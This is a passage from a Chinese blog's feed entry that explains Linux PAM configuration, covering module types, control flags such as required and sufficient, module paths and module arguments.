接受用户名和密码，进而对该用户的密码进行认证，并负责设置用户的一些秘密信息。</span><br><span class="line">account     #  检查帐户是否被允许登录系统，帐号是否已经过期，帐号的登录是否有时间段的限制等等。</span><br><span class="line">password    #  用来修改用户的密码，检测修改密码动作是否被允许以及新密码是否符合要求等。</span><br><span class="line">session     #  提供对会话的管理和记账。</span><br></pre></td></tr></table></figure><h3 id="控制方式："><a href="#控制方式：" class="headerlink" title="控制方式："></a>控制方式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">required    #  表示本模块必须返回成功才能通过认证，但是如果该模块返回失败的话，失败结果也不会立即通知用户，而是要等到同一 stack 中的所有模块全部执行完毕再将失败结果返回给应用程序。可以认为是一个必要条件。</span><br><span class="line">requisite   #  与required类似，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一 stack 内的任何模块，而是直 接将控制权返回给应用程序。是一个必要条件。</span><br><span class="line">sufficient  #  表明本模块返回成功已经足以通过身份认证的要求，不必再执行同一 stack 内的其它模块，但是如果本模块返回失败的话可以忽略。可以认为是一个充分条件。</span><br><span class="line">optional    #  表明本模块是可选的，它的成功与否一般不会对身份认证起关键作用，其返回值一般被忽略。</span><br><span class="line">include     #  将认证权利移交给其他文件。</span><br></pre></td></tr></table></figure><h3 id="模块路径："><a href="#模块路径：" class="headerlink" title="模块路径："></a>模块路径：</h3><p>设置模块路径（需绝对路径）</p><h3 id="模块参数："><a href="#模块参数：" class="headerlink" title="模块参数："></a>模块参数：</h3><p>传递给改模块的参数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;用户以文件操作的方式（如文件的增、删、改、查、传递等）与另一主机互相通信&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ftp&lt;/code&gt; 有</summary>
      
    
    
    
    <category term="网络应用竞赛" scheme="https://administratorrs.github.io/categories/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="Linux" scheme="https://administratorrs.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
